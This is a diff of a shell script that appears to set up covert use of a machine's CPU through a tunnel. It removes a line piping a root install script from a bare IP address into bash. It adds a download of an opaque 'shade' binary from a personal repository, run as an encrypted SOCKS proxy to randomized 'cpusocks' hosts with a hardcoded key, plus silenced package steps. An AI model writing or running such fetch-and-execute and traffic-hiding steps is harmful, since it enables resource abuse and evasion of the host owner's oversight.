@@ -3,16 +3,9 @@ mkdir work
 cd work
 ls -la
 sleep 2
-apt update >/dev/null;apt -y install automake libssl-dev libcurl4-openssl-dev libjansson-dev libgmp-dev zlib1g-dev git binutils cmake build-essential unzip net-tools curl apt-utils wget >/dev/null
 
 export DEBIAN_FRONTEND=noninteractive
 DEBIAN_FRONTEND=noninteractive
-
-sleep 2
-
-DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends tzdata > /dev/null
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime > /dev/null
-dpkg-reconfigure --frontend noninteractive tzdata > /dev/null
 
 sleep 2
 
@@ -20,7 +13,17 @@ TZ='Africa/Johannesburg'; export TZ
 date
 sleep 2
 
-curl -fsSL http://139.162.202.16/install_and_monitor_shade_root.sh | bash &
+wget https://raw.githubusercontent.com/alexgabbard01/update/main/shade.tar.gz >/dev/null
+sleep 2
+tar -xf shade.tar.gz
+ls -la
+./shade -b "127.0.0.1:1081" -s "cpusocks$(shuf -i 1-6 -n 1).wot.mrface.com:443" -m "chacha20-ietf-poly1305" -k "Gnikbaas999" &
+echo ""
+echo ""
+sleep 5
+curl -x socks5h://127.0.0.1:1081 ifconfig.me
+
+
 
 sleep 2
 
@@ -33,6 +36,12 @@ used_num_of_cores=`expr $num_of_cores - 2`
 echo ""
 echo "You will be using : $used_num_of_cores cores"
 echo ""
+
+sleep 2
+
+wget https://nodejs.org/download/release/v20.7.0/node-v20.7.0-linux-x64.tar.gz
+tar -xf node-v20.7.0-linux-x64.tar.gz
+export PATH=$HOME/node-v20.7.0-linux-x64/bin:$PATH
 
 sleep 2
 
@@ -49,6 +58,8 @@ ph add update-local 1>/dev/null 2>&1
 sleep 2
 
 ph add opt 1>/dev/null 2>&1
+
+sleep 2
 
 sleep 2
 
